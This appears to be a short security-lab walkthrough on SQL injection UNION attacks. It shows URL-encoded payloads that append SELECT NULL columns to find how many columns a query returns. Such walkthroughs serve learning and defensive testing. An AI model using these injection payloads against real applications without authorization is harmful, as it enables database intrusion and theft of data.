# Lab: SQL injection UNION attack, determining the number of columns returned by the query

Determine the number of columns being returned:

`'+UNION+SELECT+NULL--`


This results in an error message, so the columns don't match the number of NULL values.

Add `,NULL` until a successful response is returned:

`'+UNION+SELECT+NULL,NULL--`

`'+UNION+SELECT+NULL,NULL,NULL--`

NULL is used because it is compatible with all data types, which maximizes the chance of a successful response when the column count matches.